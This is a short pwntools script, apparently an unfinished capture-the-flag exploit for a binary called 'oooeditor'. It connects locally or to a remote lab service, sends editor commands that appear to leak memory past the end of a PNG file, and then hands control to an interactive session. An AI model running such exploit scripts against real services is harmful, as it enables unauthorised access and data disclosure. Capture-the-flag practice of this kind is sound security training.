#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
os.environ["LD_LIBRARY_PATH"]="./"
pwn_file="./oooeditor"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("10.13.37.2",8297)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

r.sendlineafter("> ","o a.png")
r.sendlineafter("> ","p 49360")
data=r.recvuntil("AE 42 60 82 00 00 00 00")
data+=r.recvline()

r.interactive()
